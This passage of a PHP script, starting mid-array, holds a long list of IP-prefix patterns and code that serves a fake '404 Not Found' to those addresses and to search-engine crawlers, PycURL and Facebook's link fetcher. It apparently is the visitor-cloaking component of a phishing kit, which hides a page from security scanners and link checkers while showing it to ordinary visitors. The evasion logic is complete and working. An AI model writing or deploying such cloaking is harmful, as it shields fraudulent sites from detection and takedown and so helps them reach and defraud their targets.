"^66.235.133.14.*", "^63.229.4.212.*", "^66.135.207.155.*", "^66.77.136.153.*", "^64.122.169.98.*", "^54.217.8.129.*", "^38.100.21.113.*", "^96.47.226.21.*", "^54.197.81.106.*", "^68.168.131.216.*", "^65.17.253.220.*", "^78.151.209.28.*", "^207.102.138.158.*", "^209.139.197.125.*", "^72.64.146.136.*", "^124.178.234.95.*", "^67.15.182.35.*", "^64.27.2.18.*", "^64.27.2.19.*", "^68.46.186.93.*", "^65.254.33.130.*", "^193.47.80.41.*", "^66.234.139.194.*", "^66.232.98.76.*", "^38.112.6.182.*", "^82.165.252.147.*", "^67.79.102.28.*", "^64.62.136.196.*", "^67.184.49.166.*", "^66.221.106.76.*", "^66.180.170.47.*", "^217.160.75.202.*", "^84.12.54.237.*", "^65.19.154.24.*", "^216.32.73.122.*", "^63.160.77.236.*", "^12.44.181.220.*", "^12.44.172.92.*", "^70.85.193.178.*", "^66.150.55.230.*", "^67.15.175.114.*", "^217.113.244.119.*", "^208.223.208.181.*", "^208.223.208.182.*", "^208.223.208.183.*", "^208.223.208.184.*", "^208.223.208.185.*", "^67.167.114.21.*", "^216.150.24.122.*", "^216.150.24.123.*", "^12.17.130.27.*", "^65.164.129.91.*", "^207.155.199.163.*", "^208.252.91.3.*", "^66.132.132.63.*", "^65.11.200.242.*", "^65.75.128.30.*", "^66.111.48.80.*", "^68.211.2.61.*", "^64.42.84.70.*", "^67.127.13.70.*", "^66.36.242.25.*", "^12.209.181.242.*", "^216.53.84.61.*", "^169.132.149.100.*", "^216.163.255.1.*", "^67.127.164.125.*", "^69.61.12.100.*", "^69.61.12.101.*", "^66.246.43.167.*", "^38.144.36.11.*", "^38.144.36.12.*", "^38.144.36.13.*", "^38.144.36.14.*", "^38.144.36.15.*", "^38.144.36.16.*", "^38.144.36.17.*", "^209.73.228.160.*", "^209.73.228.161.*", "^209.73.228.162.*", "^209.73.228.163.*", "^209.73.228.164.*", "^209.73.228.165.*", "^209.73.228.166.*", "^209.73.228.167.*", "^209.73.228.168.*", "^209.73.228.169.*", "^209.73.228.170.*", "^209.73.228.171.*", "^209.73.228.172.*", "^209.73.228.173.*", "^209.73.228.174.*", "^209.73.228.175.*", "^66.207.120.221.*", "^66.207.120.222.*", "^66.207.120.223.*", "^66.207.120.224.*", "^66.207.120.225.*", "^66.207.120.226.*", "^66.207.120.227.*", "^66.207.120.228.*", "^66.207.120.229.*", "^66.207.120.230.*", "^66.207.120.231.*", "^66.207.120.232.*", "^66.207.120.233.*", "^66.207.120.234.*", "^66.207.120.235.*", "^192.118.48.247.*", "^192.118.48.248.*", "^192.118.48.249.*", "^206.190.171.172.*", "^206.190.171.173.*", "^206.190.171.174.*", "^206.190.171.175.*", "^64.14.202.182.*", "^213.219.11.19.*", "^24.77.178.1.*", "^68.65.53.71.*", "^198.26.120.13.*", "^80.248.64.50.*", "^128.227.180.215.*", );
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

if(strpos($_SERVER['HTTP_USER_AGENT'], 'google') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { header('HTTP/1.0 404 Not Found'); exit; }

?>